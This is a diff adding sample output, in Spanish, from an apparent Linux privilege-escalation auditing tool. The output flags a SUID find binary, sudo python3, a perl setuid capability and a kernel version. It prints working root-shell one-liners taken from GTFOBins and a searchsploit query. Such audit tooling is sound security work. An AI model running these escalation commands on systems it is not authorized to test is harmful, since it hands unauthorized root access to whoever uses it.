@@ -1,0 +1,19 @@
+linprivhints 0.1.0 - usar solo con autorización
+----------------------------------------------------
+[CRITICAL] SUID explotable: /usr/bin/find
+  -> Binario SUID con técnica conocida en GTFOBins
+  $ find . -exec /bin/sh -p \; -quit
+
+[CRITICAL] sudo NOPASSWD explotable: /usr/bin/python3
+  -> GTFOBins tiene técnica sudo para este binario
+  $ sudo python3 -c 'import os;os.execl("/bin/sh","sh","-p")'
+
+[HIGH] Capability peligrosa: /usr/bin/perl cap_setuid=ep
+  -> Capability que suele permitir escalar a root
+  $ https://gtfobins.github.io/#+capabilities
+
+[INFO] Kernel: 5.15.0-91-generic
+  -> Busca CVEs conocidos para esta versión (no se descarga nada automáticamente)
+  $ searchsploit linux kernel 5.15.0-91-generic
+
+Total de hallazgos: 4
